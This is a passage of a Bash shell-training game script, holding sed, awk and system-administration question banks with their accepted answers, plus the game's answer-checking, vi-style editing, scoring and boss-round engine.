  questions+=("Replace only on lines matching|sed '/error/s/foo/bar/g' ${log}")
  questions+=("Insert line before match|sed '/pattern/i\\new line' ${txt}")
  questions+=("Insert line after match|sed '/pattern/a\\new line' ${txt}")
  questions+=("Change entire matching line|sed '/pattern/c\\replacement line' ${txt}")
  questions+=("Multiple sed commands|sed -e 's/a/b/' -e 's/c/d/' ${txt}")
  questions+=("Sed with address range|sed '5,10s/old/new/g' ${txt}")
  questions+=("Delete from line 5 to pattern|sed '5,/pattern/d' ${txt}")
  questions+=("Transform case (lowercase)|sed 's/.*/\\L&/' ${txt}")
  questions+=("Transform case (uppercase)|sed 's/.*/\\U&/' ${txt}")
  questions+=("Capitalize first letter|sed 's/.*/\\u&/' ${txt}")

  # Advanced awk
  questions+=("Print lines where field > value|awk -F',' '\$3 > 100' ${csv}")
  questions+=("Print unique values from column|awk -F',' '!seen[\$1]++' ${csv}")
  questions+=("Sum column values|awk -F',' '{sum+=\$2} END{print sum}' ${csv}")
  questions+=("Calculate average|awk -F',' '{sum+=\$2; n++} END{print sum/n}' ${csv}")
  questions+=("Find max value in column|awk -F',' 'BEGIN{max=0} \$2>max{max=\$2} END{print max}' ${csv}")
  questions+=("Find min value in column|awk -F',' 'BEGIN{min=999999} \$2<min{min=\$2} END{print min}' ${csv}")
  questions+=("Group by and count|awk -F',' '{count[\$1]++} END{for(k in count) print k, count[k]}' ${csv}")
  questions+=("Conditional print|awk -F',' '\$3==\"active\" {print \$1, \$2}' ${csv}")
  questions+=("Print with custom separator|awk -F',' 'BEGIN{OFS=\"|\"} {print \$1,\$2}' ${csv}")
  questions+=("String functions: length|awk '{print length(\$0)}' ${txt}")
  questions+=("String functions: substr|awk '{print substr(\$0,1,10)}' ${txt}")
  questions+=("String functions: gsub|awk '{gsub(/old/,\"new\"); print}' ${txt}")
  questions+=("String functions: split|awk '{n=split(\$0,a,\":\"); print a[1]}' ${txt}")
  questions+=("Pattern range|awk '/start/,/end/' ${txt}")
  questions+=("Print line numbers|awk '{print NR\": \"\$0}' ${txt}")
  questions+=("Skip header line|awk 'NR>1' ${csv}")
  questions+=("Print every nth line|awk 'NR%${n}==0' ${txt}")
  questions+=("Reverse fields|awk '{for(i=NF;i>0;i--) printf \"%s \",\$i; print \"\"}' ${txt}")

  # Combining tools
  questions+=("Complex: extract, sort, count§grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' ${log} | sort | uniq -c | sort -rn")
  questions+=("Complex: top N by frequency§awk '{print \$1}' ${log} | sort | uniq -c | sort -rn | head -${n}")
  questions+=("Complex: join lines with comma|paste -sd',' ${txt}")
  questions+=("Complex: transpose columns|awk '{for(i=1;i<=NF;i++) a[NR,i]=\$i} END{for(j=1;j<=NF;j++){for(i=1;i<=NR;i++) printf a[i,j]\" \"; print \"\"}}' ${txt}")

  # Process substitution - advanced piping
  questions+=("Diff sorted contents of ${txt} and ${txt2}|diff <(sort ${txt}) <(sort ${txt2})")
  questions+=("Compare output of two commands|diff <(cmd1) <(cmd2)")
  questions+=("Feed command output as file to program|prog <(grep pattern ${log})")

  printf '%s\n' "${questions[@]}"
}

# Level 12: System Admin
gen_level12() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # Network diagnostics
  questions+=("Ping ${ip} 5 times (use ${Y}ping${C})|ping -c 5 ${ip}")
  questions+=("Ping ${ip} continuously (use ${Y}ping${C})|ping ${ip}")
  questions+=("Trace route to ${ip} (use ${Y}traceroute${C})|traceroute ${ip}|tracepath ${ip}")
  questions+=("DNS lookup for ${host} (use ${Y}dig${C})|dig ${host}|nslookup ${host}|host ${host}")
  questions+=("Reverse DNS lookup for ${ip} (use ${Y}dig${C})|dig -x ${ip}|host ${ip}")
  questions+=("Check if port ${port} is open on ${ip} (use ${Y}nc${C})|nc -zv ${ip} ${port}")
  questions+=("Show listening ports (use ${Y}ss${C})|ss -tlnp|netstat -tlnp")
  questions+=("Show all network connections (use ${Y}ss${C})|ss -tunapl|netstat -tunapl")
  questions+=("Show routing table (use ${Y}ip${C})|ip route|ip r")
  questions+=("Show network interfaces (use ${Y}ip${C})|ip addr|ip a")

  # System monitoring
  questions+=("Show disk space usage (use ${Y}df${C})|df -h")
  questions+=("Show memory usage (use ${Y}free${C})|free -h")
  questions+=("Show system uptime (use ${Y}uptime${C})|uptime")
  questions+=("Show system info (use ${Y}uname${C})|uname -a")
  questions+=("Show CPU info (use ${Y}lscpu${C})|lscpu|cat /proc/cpuinfo")
  questions+=("Show kernel messages (use ${Y}dmesg${C})|dmesg|dmesg -T")
  questions+=("Interactive process viewer (use ${Y}top${C})|top|htop|btop")
  questions+=("Show top 10 memory-hungry processes (use ${Y}ps${C})§ps aux --sort=-%mem | head -11")
  questions+=("Show process tree (use ${Y}pstree${C})|pstree|ps auxf")

  # Service management (systemd)
  questions+=("Check status of ${svc}|systemctl status ${svc}")
  questions+=("Start ${svc}|systemctl start ${svc}")
  questions+=("Stop ${svc}|systemctl stop ${svc}")
  questions+=("Restart ${svc}|systemctl restart ${svc}")
  questions+=("Enable ${svc} at boot|systemctl enable ${svc}")
  questions+=("Disable ${svc} at boot|systemctl disable ${svc}")
  questions+=("List running services|systemctl list-units --type=service --state=running")
  questions+=("Show services that failed to start|systemctl --failed")
  questions+=("Reload systemd daemon|systemctl daemon-reload")
  questions+=("Show ${svc} logs|journalctl -u ${svc}")
  questions+=("Follow ${svc} logs|journalctl -fu ${svc}")
  questions+=("Show logs since boot|journalctl -b")
  questions+=("Show last 100 log lines|journalctl -n 100")

  # User/permission management
  questions+=("Run command as root|sudo ${script}")
  questions+=("Switch to root shell|sudo -i|su -")
  questions+=("Switch to user ${user}|su - ${user}")
  questions+=("Add user ${user}|useradd -m ${user}|sudo useradd -m ${user}")
  questions+=("Delete user ${user}|userdel -r ${user}|sudo userdel -r ${user}")
  questions+=("Change password for ${user}|passwd ${user}|sudo passwd ${user}")
  questions+=("Add ${user} to group wheel|usermod -aG wheel ${user}")
  questions+=("List groups for ${user}|groups ${user}|id ${user}")
  questions+=("Change owner of ${txt} to ${user}|chown ${user} ${txt}")
  questions+=("Change owner and group|chown ${user}:${user} ${txt}")
  questions+=("Change owner recursively|chown -R ${user}:${user} ${dir}/")
  questions+=("Show current user|whoami")
  questions+=("Show user id info|id")

  # Package management (common patterns)
  questions+=("Update package lists (Arch)|pacman -Sy|paru -Sy")
  questions+=("Upgrade all packages (Arch)|pacman -Syu|paru -Syu")
  questions+=("Search for package|pacman -Ss ${term}|paru -Ss ${term}")
  questions+=("Show package info|pacman -Qi ${term}|paru -Qi ${term}")
  questions+=("List installed packages|pacman -Q|paru -Q")
  questions+=("Which package owns a file|pacman -Qo /usr/bin/${term}|paru -Qo /usr/bin/${term}")

  printf '%s\n' "${questions[@]}"
}

# ═══════════════════════════════════════════════════════════════════════════════
# QUESTION SYSTEM - Generate and manage questions per level
# ═══════════════════════════════════════════════════════════════════════════════

# Level descriptions
declare -A LEVEL_DESC=(
  [0]="First Commands" [1]="Save Output" [2]="Read Files" [3]="Basic Pipes"
  [4]="Input Redirection" [5]="Error Redirection" [6]="Logic Operators" [7]="Job Control"
  [8]="Variables" [9]="Special Variables" [10]="Test Operators"
  [11]="Core Tools" [12]="System Admin" [13]="tmux & Screen"
  [14]="Text Search" [15]="File Finding" [16]="Data Processing" [17]="String & Arrays"
  [18]="Control Flow" [19]="Batch Ops" [20]="Advanced Regex" [21]="Git"
  [22]="Network Tools" [23]="Network Scanning" [24]="Local Network & RF"
  [25]="Hash Cracking" [26]="Forensics" [27]="Privilege Escalation" [28]="Survival"
)

# Generate questions for a level (called once per level attempt)
declare -a CURRENT_QUESTIONS=()
generate_level() {
  local level=$1
  CURRENT_QUESTIONS=()
  local raw

  # Main level questions
  raw=$(gen_level${level})
  while IFS= read -r line; do
    [[ -n "$line" ]] && CURRENT_QUESTIONS+=("$line")
  done <<< "$raw"

  # Review: add 1-2 questions from each previous level (skills you've "acquired")
  if ((level > 0)); then
    local review=()
    for ((prev=0; prev<level; prev++)); do
      local prev_raw prev_arr=()
      prev_raw=$(gen_level${prev})
      while IFS= read -r line; do
        [[ -n "$line" ]] && prev_arr+=("$line")
      done <<< "$prev_raw"
      # Pick 1-2 random questions from this previous level
      if ((${#prev_arr[@]} > 0)); then
        readarray -t picks < <(printf '%s\n' "${prev_arr[@]}" | shuf | head -2)
        review+=("${picks[@]}")
      fi
    done
    # Add review questions to the mix
    CURRENT_QUESTIONS+=("${review[@]}")
  fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# CORE ENGINE (mostly unchanged from original)
# ═══════════════════════════════════════════════════════════════════════════════

# Normalize flags: -la == -al == -a -l
norm() {
  local parts flags=() args=() out p
  read -ra parts <<< "$1"; out="${parts[0]}"
  for p in "${parts[@]:1}"; do
    if [[ "$p" == -* ]]; then
      [[ "$p" =~ ^-[a-zA-Z]+$ && ${#p} -gt 2 ]] && { for ((j=1;j<${#p};j++)); do flags+=("-${p:j:1}"); done; } || flags+=("$p")
    else args+=("$p"); fi
  done
  readarray -t flags < <(printf '%s\n' "${flags[@]}"|LC_ALL=C sort)
  printf '%s' "$out"; printf ' %s' "${flags[@]}" "${args[@]}"; echo
}

_SANDBOX_OUTPUT=""  # Store output for display after check
check() {
  local inp="${1#"${1%%[![:space:]]*}"}" a b ninp; inp="${inp%"${inp##*[![:space:]]}"}"; ninp=$(norm "$inp")
  _SANDBOX_OUTPUT=""

  # Sandbox mode: execute command and validate output/state
  if ((SANDBOX_MODE && !_qtext)); then
    local output
    output=$(_sandbox_exec "$inp" 5 2>&1)
    _SANDBOX_OUTPUT="$output"

    # Track destructive commands for reset
    _is_destructive "$inp" && _SANDBOX_DESTRUCTIVE=1

    # Validate based on markers
    if [[ -n "$_qoutput" ]]; then
      _sandbox_check_output "$output" "$_qoutput" && return 0
    fi
    if [[ -n "$_qstate" ]]; then
      _sandbox_check_state "$_qstate" && return 0
    fi

    # Fall through to text matching if no markers or sandbox failed
  fi

  # Text matching fallback (§ delimiter for questions with pipes, | for legacy)
  local delim='|'; [[ "$2" == *§* ]] && delim='§'
  local -a opts; IFS="$delim" read -ra opts <<< "$2"
  for a in "${opts[@]}"; do
    b="${a#"${a%%[![:space:]]*}"}"; b="${b%"${b##*[![:space:]]}"}"
    # ~pattern = regex match
    if [[ "$b" == ~* ]]; then
      [[ "$inp" =~ ${b:1} ]] && return 0
    else
      [[ "$inp" == "$b" || "$ninp" == "$(norm "$b")" ]] && return 0
    fi
  done; return 1
}

LVL=0 QI=0 HINT=false PROG=0 TOT=0
load() { [[ -f "$DATA/session.json" ]] && { local t=$(<"$DATA/session.json"); LVL="${t#*\"level\":}"; LVL="${LVL%%[!0-9]*}"; [[ "$t" == *'"qi":'* ]] && { QI="${t#*\"qi\":}"; QI="${QI%%[!0-9]*}"; }; }; LVL=${LVL:-0}; QI=${QI:-0}; }
save() { printf '{"level":%d,"qi":%d}\n' "$LVL" "$QI" > "$DATA/session.json"; }
# Score tracking: tier 1=blank, 2=recall (md5 hash keys avoid regex issues)
_hash() { local h; h=$(printf '%s' "$1"|md5sum); echo "${h:0:16}"; }

stats() {
  local -A sc; [[ -f "$DATA/scores" ]] && while IFS='|' read -r k v; do sc[$k]=$v; done < "$DATA/scores"
  echo -e "${C}${PLAYER_NAME:-anon}${N} | ${Y}${PLAYER_XP:-0} XP${N}"
  echo -e "${D}Stats show unique prompts seen${N}\n"
  local total_seen=0 total_t1=0 total_t2=0
  for k in "${!sc[@]}"; do
    case "${sc[$k]}" in 1) ((++total_t1));; *) ((++total_t2));; esac
    ((++total_seen))
  done
  echo -e "Total: ${B}${total_seen}${N}  ${Y}${total_t1}${N} learning  ${G}${total_t2}${N} mastered"
  echo
  for lv in {0..28}; do printf "  ${C}%2d${N} %-25s %s\n" "$lv" "${LEVEL_NAMES[$lv]:-}" "${BOSS_NAMES[$lv]:-}"; done
}

# Tier display: removed - pure recall, Tab for hints
show_tier() { :; }

input="" cursor=0 mode="insert" SHOW_HINT=0 EXPLAIN_LINES=0 _rep=""
declare -a UNDO_STACK=()  # Multi-level undo
_last_cmd="" _last_arg=""  # For dot repeat
clear_hint() { for ((i=0;i<=EXPLAIN_LINES;i++)); do printf '\e[A\e[2K'; done; printf '\r'; }
hdr() {
  printf '\e[2J\e[H'
  local fire=""; ((streak>=5)) && fire="  ${R}🔥${N} ${Y}2x${N}"
  echo -e "${C}${PLAYER_NAME:-anon}${N} | ${Y}${PLAYER_XP:-0} XP${N}${fire}"
  echo -e "${B}Level $1: ${LEVEL_NAMES[$1]:-}${N}"
  echo -e "${D}[$2/$3]  Tab=hint${N}\n"
}
qdisp() { bar; echo -e "\n${C}$1${N}"; show_tier "$2" "$3"; echo; }
bar() { local f e; printf -v f '%*s' "$PROG" ''; printf -v e '%*s' "$((TOT-PROG))" ''; printf "${G}[${Y}%s${D}%s${G}]${N}" "${f// /█}" "${e// /░}"; }
draw() {
  echo -ne "\e[?25l\r\e[K"  # hide cursor, clear line
  if ((SHOW_HINT)); then
    echo -ne "${D}$PROMPT_CHAR${ans}${N}"
  else
    ((VI_MODE)) && [[ $mode != insert ]] && echo -ne "\e[91m$PROMPT_CHAR\e[0m" || echo -ne "\e[97m$PROMPT_CHAR\e[0m"
    echo -n "$input"
    # Use display width for UTF-8 correct cursor positioning
    local disp_len=$(_dispwidth "$input") disp_cur=$(_dispwidth "${input:0:cursor}")
    ((disp_cur < disp_len)) && echo -ne "\e[$((disp_len - disp_cur))D"
  fi
  echo -ne "\e[?25h"  # show cursor
}

# Display width (character count, not bytes)
_dispwidth() { echo ${#1}; }

# Vi helpers (byte-indexed; UTF-8 multi-byte chars may cause cursor drift)
_wfwd() { while ((cursor<${#input})) && [[ "${input:cursor:1}" != " " ]]; do ((++cursor)); done; while ((cursor<${#input})) && [[ "${input:cursor:1}" == " " ]]; do ((++cursor)); done; ((cursor>=${#input}&&${#input}>0)) && cursor=$((${#input}-1)); }
_wbck() { ((cursor>0)) && ((cursor--)); while ((cursor>0)) && [[ "${input:cursor:1}" == " " ]]; do ((cursor--)); done; while ((cursor>0)) && [[ "${input:cursor-1:1}" != " " ]]; do ((cursor--)); done; }
_wend() { ((cursor<${#input}-1)) && ((++cursor)); while ((cursor<${#input}-1)) && [[ "${input:cursor:1}" == " " ]]; do ((++cursor)); done; while ((cursor<${#input}-1)) && [[ "${input:cursor+1:1}" != " " ]]; do ((++cursor)); done; }
_clamp() { ((cursor>=${#input}&&cursor>0)) && cursor=$((${#input}-1)); }
_del() { # $1=motion
  local e=$cursor
  case "$1" in
    d|c) input="" cursor=0;;
    w) while ((e<${#input})) && [[ "${input:e:1}" != " " ]]; do ((++e)); done; input="${input:0:cursor}${input:e}";;
    b) ((e>0)) && ((e--)); while ((e>0)) && [[ "${input:e:1}" == " " ]]; do ((e--)); done; while ((e>0)) && [[ "${input:e-1:1}" != " " ]]; do ((e--)); done; input="${input:0:e}${input:cursor}"; cursor=$e;;
    \$) input="${input:0:cursor}";;
    0) input="${input:cursor}"; cursor=0;;
  esac; _clamp
}

run() {
  local lv=$1 shuf=() qi=${QI:-0} done=0 streak=0
  local -a HIST=() SEEN_PROMPTS=() ; local HIST_IDX=0 HIST_SAVE=""
  # Save terminal state for clean restoration
  _stty_saved=$(stty -g 2>/dev/null) || _stty_saved=""

  # Initialize sandbox for this level
  ((SANDBOX_MODE)) && _sandbox_init

  generate_level "$lv"  # Generate fresh questions for this level
  local -A _sc; [[ -f "$DATA/scores" ]] && while IFS='|' read -r k v; do _sc[$k]=$v; done < "$DATA/scores"
  _sget() { local h=$(_hash "$1"); echo "${_sc[$h]:-1}"; }  # Default tier 1 (no braindead copy)
  _sset() {
    local h=$(_hash "$1"); _sc[$h]=$2
    # Atomic update with flock to prevent race conditions
    (
      flock -x 200
      sed -i "/^$h|/d" "$DATA/scores" 2>/dev/null
      echo "$h|$2">>"$DATA/scores"
    ) 200>"$DATA/scores.lock"
  }
  TOT=${#CURRENT_QUESTIONS[@]}; PROG=$qi
  # Prioritize by tier: 1 (blank) > 2 (recall) - no tier 0 copy mode
  local t1=() t2=()
  for q in "${CURRENT_QUESTIONS[@]}"; do
    _qparse "$q"
    case "$(_sget "$_qprompt")" in 1) t1+=("$q");; *) t2+=("$q");; esac
  done
  # Shuffle and interleave: tier 1 first, mix in tier 2
  local _shuf1=() _shuf2=()
  ((${#t1[@]} > 0)) && readarray -t _shuf1 < <(printf '%s\n' "${t1[@]}" | LC_ALL=C shuf)
  ((${#t2[@]} > 0)) && readarray -t _shuf2 < <(printf '%s\n' "${t2[@]}" | LC_ALL=C shuf)
  shuf=()
  local i1=0 i2=0 idx=0
  while ((i1 < ${#_shuf1[@]} || i2 < ${#_shuf2[@]})); do
    if ((i1 < ${#_shuf1[@]})); then shuf+=("${_shuf1[$i1]}"); ((++i1))
    elif ((i2 < ${#_shuf2[@]})); then shuf+=("${_shuf2[$i2]}"); ((++i2))
    fi
    ((++idx))
  done
  # Safety check: if no questions to practice, skip to boss (or show error)
  if ((${#shuf[@]} == 0)); then
    echo -e "${Y}DEBUG: CURRENT_QUESTIONS=${#CURRENT_QUESTIONS[@]} t1=${#t1[@]} t2=${#t2[@]}${N}"
    echo -e "${Y}No questions to practice. Straight to boss!${N}"
    sleep 2
  fi
  while ((qi < ${#shuf[@]})); do
    # Reset sandbox if previous command was destructive
    ((SANDBOX_MODE && _SANDBOX_DESTRUCTIVE)) && { _sandbox_reset; _SANDBOX_DESTRUCTIVE=0; }

    _qparse "${shuf[$qi]}"; local prompt=$_qprompt ans=$_qans
    SEEN_PROMPTS+=("$prompt")  # Track for boss exclusion
    local tier; tier=$(_sget "$prompt")
    # Fire mode: force tier 2 (pure recall, no hints)
    ((streak>=5)) && tier=2
    HINT=false SHOW_HINT=0 EXPLAIN_LINES=0
    hdr "$lv" "$((qi+1))" "$TOT"; qdisp "$prompt" "$tier" "$ans"
    while true; do
      input="" cursor=0 mode="insert" SHOW_HINT=0; UNDO_STACK=(); HIST_IDX=${#HIST[@]}; HIST_SAVE=""
      read -t 0.01 -rsn 1000 ||:
      draw
      while IFS= read -rsn1 c; do
        if [[ "$c" == $'\t' ]]; then
          # Toggle hint + explanation
          if ((SHOW_HINT)); then
            SHOW_HINT=0; clear_hint
          else
            SHOW_HINT=1; HINT=true; draw; echo; explain "$ans"; continue
          fi
          draw; continue
        fi
        if [[ "$mode" == "insert" ]]; then
          # Clear hint display if typing
          if ((SHOW_HINT)) && [[ "$c" != $'\x1b' && "$c" != '' ]]; then
            SHOW_HINT=0; clear_hint
          fi
          case "$c" in
            $'\x04') echo -e "\n${D}[quit]${N}"; exit 0;;  # Ctrl+D quit
            $'\x1b')  # ESC or arrow key
              local _e1 _e2; read -rsn1 -t 0.01 _e1 || _e1=""
              if [[ "$_e1" == "[" ]]; then
                read -rsn1 -t 0.01 _e2 || _e2=""
                case "$_e2" in
                  A)  # Up arrow - history back
                    if ((${#HIST[@]} > 0 && HIST_IDX > 0)); then
                      ((HIST_IDX == ${#HIST[@]})) && HIST_SAVE="$input"
                      ((HIST_IDX--)); input="${HIST[$HIST_IDX]}"; cursor=${#input}; draw
                    fi;;
                  B)  # Down arrow - history forward
                    if ((HIST_IDX < ${#HIST[@]})); then
                      ((++HIST_IDX))
                      if ((HIST_IDX == ${#HIST[@]})); then input="$HIST_SAVE"; else input="${HIST[$HIST_IDX]}"; fi
                      cursor=${#input}; draw
                    fi;;
                  *) ;;  # Ignore other sequences
                esac
              elif [[ -z "$_e1" ]] && ((VI_MODE)); then
                mode="normal"; ((cursor>0)) && ((cursor--)); draw
              fi;;
            $'\x7f'|$'\b') ((cursor>0)) && { input="${input:0:cursor-1}${input:cursor}"; ((cursor--)); draw; };;
            '') echo; break;;
            *) input="${input:0:cursor}${c}${input:cursor}"; ((++cursor)); draw;;
          esac
        elif ((VI_MODE)); then
          # Clear hint display if any vi command
          if ((SHOW_HINT)); then SHOW_HINT=0; clear_hint; fi
          # Number prefix: accumulate digits
          if [[ "$c" =~ ^[1-9]$ ]] || { [[ "$c" == "0" ]] && [[ -n "$_rep" ]]; }; then _rep+="$c"; continue; fi
          local _n=${_rep:-1}; _rep=""
          # Push to undo stack before destructive operations
          case "$c" in s|S|x|X|D|C|d|c|r) UNDO_STACK+=("$input:$cursor");; esac
          case "$c" in
            i) mode="insert"; draw;; a) mode="insert"; ((cursor<${#input})) && ((++cursor)); draw;;
            A) mode="insert"; cursor=${#input}; draw;; I) mode="insert"; cursor=0; draw;;
            s) ((${#input}>0)) && input="${input:0:cursor}${input:cursor+1}"; mode="insert"; draw;;
            S) input="" cursor=0 mode="insert"; draw;;
            h) for ((_i=0;_i<_n&&cursor>0;_i++)); do ((cursor--)); done; draw;;
            l) for ((_i=0;_i<_n&&cursor<${#input}-1;_i++)); do ((++cursor)); done; draw;;
            k) ((${#HIST[@]}>0&&HIST_IDX>0)) && { ((HIST_IDX==${#HIST[@]})) && HIST_SAVE="$input"; ((HIST_IDX--)); input="${HIST[$HIST_IDX]}"; cursor=${#input}; _clamp; draw; };;
            j) ((HIST_IDX<${#HIST[@]})) && { ((++HIST_IDX)); ((HIST_IDX==${#HIST[@]})) && input="$HIST_SAVE" || input="${HIST[$HIST_IDX]}"; cursor=${#input}; _clamp; draw; };;
            0) cursor=0; draw;; \$) cursor=$((${#input}>0?${#input}-1:0)); draw;;
            w) for ((_i=0;_i<_n;_i++)); do _wfwd; done; draw;;
            b) for ((_i=0;_i<_n;_i++)); do _wbck; done; draw;;
            e) for ((_i=0;_i<_n;_i++)); do _wend; done; draw;;
            f) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor+1;p<${#input};p++)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$p; break; }; done; done; draw;;
            F) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor-1;p>=0;p--)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$p; break; }; done; done; draw;;
            t) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor+1;p<${#input};p++)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$((p-1)); break; }; done; done; draw;;
            T) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do for ((p=cursor-1;p>=0;p--)); do [[ "${input:p:1}" == "$c2" ]] && { cursor=$((p+1)); break; }; done; done; draw;;
            x) for ((_i=0;_i<_n&&${#input}>0&&cursor<${#input};_i++)); do input="${input:0:cursor}${input:cursor+1}"; done; _clamp; draw;;
            X) for ((_i=0;_i<_n&&cursor>0;_i++)); do input="${input:0:cursor-1}${input:cursor}"; ((cursor--)); done; draw;;
            D) input="${input:0:cursor}"; ((cursor>0)) && ((cursor--)); draw;;
            C) input="${input:0:cursor}"; mode="insert"; draw;;
            r) IFS= read -rsn1 c2; [[ -n "$c2" && "$c2" != $'\x1b' ]] && { input="${input:0:cursor}${c2}${input:cursor+1}"; draw; };;
            d) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do _del "$c2"; done; draw;;
            c) IFS= read -rsn1 c2; for ((_i=0;_i<_n;_i++)); do _del "$c2"; done; mode="insert"; draw;;
            u) ((${#UNDO_STACK[@]}>0)) && { local _u="${UNDO_STACK[-1]}"; unset 'UNDO_STACK[-1]'; input="${_u%:*}"; cursor="${_u#*:}"; draw; };;  # multi-level undo
            g) IFS= read -rsn1 c2; [[ "$c2" == "g" ]] && { cursor=0; draw; };;  # gg = start
            G) cursor=$((${#input}>0?${#input}-1:0)); draw;;  # G = end
            q) echo -e "\n${D}[quit]${N}"; exit 0;;  # quit
            \?) echo -e "\n${D}hl${N} move  ${D}kj${N}/↑↓ history  ${D}wb${N} word  ${D}fFtT${N}+char find  ${D}0\$/gg/G${N} line"; echo -e "${D}x/X${N} del char  ${D}dw/db/dd${N} del  ${D}cw/cb/cc${N} change  ${D}r${N} replace"; echo -e "${D}s/S${N} subst  ${D}i/a/I/A${N} insert  ${D}u${N} undo(stack)  ${D}q${N} quit"; echo -e "${D}Tab${N} hint  ${D}Ctrl+d${N} quit  ${D}[num]cmd${N} repeat"; read -rsn1; hdr "$lv" "$((qi+1))" "$TOT"; qdisp "$prompt" "$tier" "$ans"; draw;;
            '') echo; break;;
          esac
        fi
      done
      if check "$input" "$_qanswers"; then
        [[ -n "$input" ]] && { HIST+=("$input"); HIST_IDX=${#HIST[@]}; HIST_SAVE=""; }
        ((++PROG))
        # Show sandbox output prominently
        if [[ -n "$_SANDBOX_OUTPUT" ]]; then
          echo -e "\n${W}${_SANDBOX_OUTPUT}${N}"
        fi
        if $HINT; then
          echo -e "\n${Y}+1${N} ${D}(hint)${N}"; streak=0; _sset "$prompt" "$tier"
        elif ((streak>=5)); then
          ((++done)); ((++done)); echo -e "\n${R}${B}🔥 ON FIRE!${N} ${Y}+2${N}"; ((++streak)); _sset "$prompt" "$((tier<2?tier+1:2))"
        else
          ((++done)); echo -e "\n${G}${B}✓${N}"; ((++streak)); _sset "$prompt" "$((tier<2?tier+1:2))"
        fi
        read -rsp $'\e[2mPress Enter...\e[0m'  # pause to see output
        ((++qi)); QI=$qi; save; break
      else
        # Wrong answer - show expected with full breakdown
        if [[ -n "$_SANDBOX_OUTPUT" ]]; then
          echo -e "\n${D}output:${N} ${_SANDBOX_OUTPUT}"
        fi
        echo -e "${R}✗${N}  ${D}expected:${N} ${Y}${ans}${N}\n"
        explain "$ans"  # show full breakdown so they learn
        streak=0; _sset "$prompt" "$((tier>0?tier-1:0))"; read -rsp $'\e[2mPress Enter...\e[0m'
      fi
      tier=$(_sget "$prompt"); hdr "$lv" "$((qi+1))" "$TOT"; qdisp "$prompt" "$tier" "$ans"
    done
  done
  # === BOSS ROUND ===
  _boss_splash "$lv"

  # Pick 5 random questions, excluding ones seen during practice
  local boss_q=() boss_correct=0 boss_total=5 unseen_q=()
  for q in "${CURRENT_QUESTIONS[@]}"; do
    _qparse "$q"; local p=$_qprompt seen=0
    for s in "${SEEN_PROMPTS[@]}"; do [[ "$p" == "$s" ]] && { seen=1; break; }; done
    ((seen)) || unseen_q+=("$q")
  done
  # Use unseen questions if enough, otherwise fall back to all
  if ((${#unseen_q[@]} >= boss_total)); then
    readarray -t boss_q < <(printf '%s\n' "${unseen_q[@]}" | shuf | head -$boss_total)
  else
    readarray -t boss_q < <(printf '%s\n' "${CURRENT_QUESTIONS[@]}" | shuf | head -$boss_total)
  fi

  for ((bi=0; bi<${#boss_q[@]}; bi++)); do
    _qparse "${boss_q[$bi]}"; local prompt=$_qprompt ans=$_qans
    # Skip malformed questions
    [[ -z "$prompt" ]] && { ((boss_total--)); continue; }
    printf '\e[2J\e[H'
    echo -e "${R}${B}═══ BOSS ${bi+1}/${boss_total} ═══${N}\n"
    echo -e "${C}${prompt}${N}\n"

    input="" cursor=0 mode="insert"
    draw
    while IFS= read -rsn1 c; do
      if [[ "$c" == $'\t' ]]; then
        echo -e "\n${R}No hints in boss mode!${N}"; sleep 0.5
        printf '\e[A\e[2K'; draw; continue
      fi
      if [[ "$mode" == "insert" ]]; then
        case "$c" in
          $'\x1b') ((VI_MODE)) && { mode="normal"; ((cursor>0)) && ((cursor--)); draw; } ;;
          $'\x7f'|$'\b') ((cursor>0)) && { input="${input:0:cursor-1}${input:cursor}"; ((cursor--)); draw; } ;;
          '') echo; break ;;
          *) input="${input:0:cursor}${c}${input:cursor}"; ((++cursor)); draw ;;
        esac
      elif ((VI_MODE)); then
        case "$c" in
          i) mode="insert"; draw;; a) mode="insert"; ((cursor<${#input})) && ((++cursor)); draw;;
          h) ((cursor>0)) && ((cursor--)); draw;; l) ((cursor<${#input}-1)) && ((++cursor)); draw;;
          0) cursor=0; draw;; \$) cursor=$((${#input}>0?${#input}-1:0)); draw;;
          x) ((${#input}>0)) && { input="${input:0:cursor}${input:cursor+1}"; }; draw;;
          '') echo; break ;;
        esac
      fi
    done

    if check "$input" "$_qanswers"; then
      ((++boss_correct))
      echo -e "${G}${B}✓${N}"
    else
      echo -e "${R}✗${N}  ${D}expected:${N} ${Y}${ans}${N}\n"
      explain "$ans"
    fi
    sleep 0.8
  done

  # Results
  printf '\e[2J\e[H'
  local boss="${BOSS_NAMES[$lv]}"
  if ((boss_correct >= 4)); then
    echo -e "${G}${B}══ ${boss} DEFEATED ══${N}"
    echo -e "${G}${boss_correct}/${boss_total}${N} correct!"
    ((PLAYER_XP += 100)); _save_profile
    echo -e "${Y}+100 XP${N}"
    echo -e "${C}You acquired: ${LEVEL_NAMES[$lv]}${N}\n"
    ((lv<28)) && { echo -e "Enter for Level $((lv+1))..."; read -r; LVL=$((lv+1)); QI=0; save; run "$LVL"; } || echo -e "${G}${B}ALL COMPLETE - ROOT ACCESS GRANTED${N}"
  else
    echo -e "${R}${B}══ ${boss} PREVAILS ══${N}"
    echo -e "${R}${boss_correct}/${boss_total}${N} - need 4 to pass\n"
    echo -e "${D}r = retry, p = practice${N}"
    read -rsn1 choice
    case "$choice" in
      r) QI=0; run "$lv" ;;
      *) QI=0; save; run "$lv" ;;
    esac
  fi
}

# Handle --no-sandbox flag
[[ "${1:-}" == "--no-sandbox" ]] && { SANDBOX_MODE=0; shift; }

case "${1:-}" in
  [0-9]|1[0-9]|2[0-8]) _tty; _load_profile; LVL=$1; QI=0; save; run "$LVL";;
  r|reset) rm -f "$DATA"/*.json "$DATA/scores" "$DATA/scores.lock" "$DATA/profile"; rm -rf "$DATA/sandbox" "$DATA/sandbox.pristine" 2>/dev/null; echo "Reset.";;
